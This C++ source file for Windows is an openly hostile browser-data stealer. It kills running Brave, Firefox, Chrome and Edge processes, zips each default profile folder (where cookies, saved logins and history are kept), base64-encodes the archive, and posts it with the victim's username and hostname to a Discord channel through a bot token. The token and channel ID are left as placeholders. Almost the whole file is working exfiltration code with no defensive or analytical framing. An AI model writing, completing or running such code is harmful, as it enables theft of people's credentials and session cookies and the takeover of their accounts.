#include <iostream>
#include <string>
#include <windows.h>
#include "miniz.h"
#include <cstdio>
#include <cstring>
#include <vector>
#include <codecvt>
#include <tchar.h>
#include <io.h>
#include <tlhelp32.h>
#include <curl/curl.h>

std::string getUsername() {
    char strUsername[50];
    size_t BufferSize = sizeof(strUsername);
    getenv_s(&BufferSize, strUsername, sizeof(strUsername), "USERNAME");
    return strUsername;
}

std::string getHostname() {
    wchar_t hostname[1024];
    DWORD size = sizeof(hostname);
    GetComputerNameEx(ComputerNameDnsHostname, hostname, &size);

    int len = WideCharToMultiByte(CP_ACP, 0, hostname, -1, NULL, 0, NULL, NULL);
    char* narrow_str = new char[len];
    WideCharToMultiByte(CP_ACP, 0, hostname, -1, narrow_str, len, NULL, NULL);
    std::string host_name = narrow_str;
    delete[] narrow_str;
    return host_name;
}

std::string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
    std::string ret;
    int i = 0;
    int j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];
    const std::string base64_chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";

    while (in_len--) {
        char_array_3[i++] = *(bytes_to_encode++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; (i < 4); i++)
                ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }

    if (i)
    {
        for (j = i; j < 3; j++)
            char_array_3[j] = '\0';

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;

        for (j = 0; (j < i + 1); j++)
            ret += base64_chars[char_array_4[j]];

        while ((i++ < 3))
            ret += '=';
    }

    return ret;
}
 
std::string TCHARToUTF8(const TCHAR* str) {
    int size = WideCharToMultiByte(CP_UTF8, 0, str, -1, NULL, 0, NULL, NULL);
    std::string result(size, 0);
    WideCharToMultiByte(CP_UTF8, 0, str, -1, &result[0], size, NULL, NULL);
    return result;
}

void terminateInstances(std::string processName) {
    HANDLE hProcessSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);

    PROCESSENTRY32 ProcessEntry = { 0 };
    ProcessEntry.dwSize = sizeof(ProcessEntry);

    BOOL Return = FALSE;
Label:Return = Process32First(hProcessSnapShot, &ProcessEntry);

    if (!Return)
    {
        goto Label;
    }

    do {
        std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
        std::wstring wprocessName = converter.from_bytes(processName);
        int value = _tcsicmp(ProcessEntry.szExeFile, wprocessName.c_str());
        if (value == 0)
        {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, ProcessEntry.th32ProcessID);
            TerminateProcess(hProcess,0);
            CloseHandle(hProcess);
        }
    } while (Process32Next(hProcessSnapShot, &ProcessEntry));
    CloseHandle(hProcessSnapShot);
    Sleep(50);
}

std::string zipIt(const std::string& folder_path) {
    std::vector<char> zip_data;

    mz_zip_archive zip;
    size_t zip_size = 0;
    memset(&zip, 0, sizeof(zip));
    if (!mz_zip_writer_init_heap(&zip, 0, zip_size)) {
        return "";
    }

    std::vector<std::string> file_list;
    WIN32_FIND_DATA ffd;
    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
    std::wstring wstr = converter.from_bytes(folder_path + "\\*");
    HANDLE hFind = FindFirstFileW(wstr.c_str(), &ffd);
    if (hFind == INVALID_HANDLE_VALUE) {
        mz_zip_writer_end(&zip);
        std::cerr << "Error reading directory " << folder_path + "\\*" << std::endl;
        return "";
    }
    do {
        if (_tcscmp(ffd.cFileName, _T(".")) == 0 || _tcscmp(ffd.cFileName, _T("..")) == 0 || _tcscmp(ffd.cFileName, _T("lockfile")) == 0) {
            continue;
        }
        std::string file_name = TCHARToUTF8(ffd.cFileName);
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            continue;
        }
        else {
            file_list.push_back(file_name);
        }
    } while (FindNextFile(hFind, &ffd) != 0);
    FindClose(hFind);

    for (const auto& file_name : file_list) {
        std::string file_path = std::string(folder_path) + "\\" + file_name;
        if (!mz_zip_writer_add_file(&zip, file_name.c_str(), file_path.c_str(), NULL, 0, MZ_BEST_COMPRESSION)) {
            std::cerr << "Error adding file to zip archive: " << file_path << std::endl;
            mz_zip_writer_end(&zip);
            return "";
        }
    }

    void* zip_buffer = NULL;
    if (!mz_zip_writer_finalize_heap_archive(&zip, &zip_buffer, &zip_size)) {
        mz_zip_writer_end(&zip);
        return "";
    }

    std::string zip_base64 = base64_encode(reinterpret_cast<const unsigned char*>(zip_buffer), zip_size);

    mz_zip_writer_end(&zip);
    return zip_base64;
}

void sendToDiscord(const std::string& message, const std::string& api_token) {
    std::string payload = "{\"content\": \"" + getUsername() + " - " + getHostname() + "\n" + message + "\"}";
    std::string CHANNELID = "";
    CURL* curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, "https://discordapp.com/api/v6/channels/"+CHANNELID+"/messages");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());

    struct curl_slist* headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    headers = curl_slist_append(headers, ("Authorization: Bot " + api_token).c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    CURLcode res = curl_easy_perform(curl);

    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);
}

void verifyAndExfil(std::string Username) {
    std::string pathFirefox = "C:\\Users\\"+Username+"\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\Default";
    std::string pathChrome = "C:\\Users\\"+Username+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default";
    std::string pathEdge = "C:\\Users\\"+Username+"\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default";
    std::string pathBrave = "C:\\Users\\"+Username+"\\AppData\\Local\\BraveSoftware\\Brave-Browser\\Default";

    std::string zipData;
    
    std::string apiToken = "Discord TOKEN API";

    if(_access(pathBrave.c_str(), 0) == 0) {
        terminateInstances("brave.exe");
        zipData = zipIt(pathBrave);
        sendToDiscord(zipData, apiToken);
    }
    if (_access(pathFirefox.c_str(), 0) == 0) {
        terminateInstances("firefox.exe");
        zipData = zipIt(pathFirefox);
        sendToDiscord(zipData, apiToken);
    }
    if (_access(pathChrome.c_str(), 0) == 0) {
        terminateInstances("chrome.exe");
        zipData = zipIt(pathChrome);
        sendToDiscord(zipData, apiToken);
    }
    if (_access(pathEdge.c_str(), 0) == 0) {
        terminateInstances("msedge.exe");
        zipData = zipIt(pathEdge);
        sendToDiscord(zipData, apiToken);
    }
}

int main()
{
    std::string username;
    username = getUsername();
    bool result;
    verifyAndExfil(username);
    return 0;
}
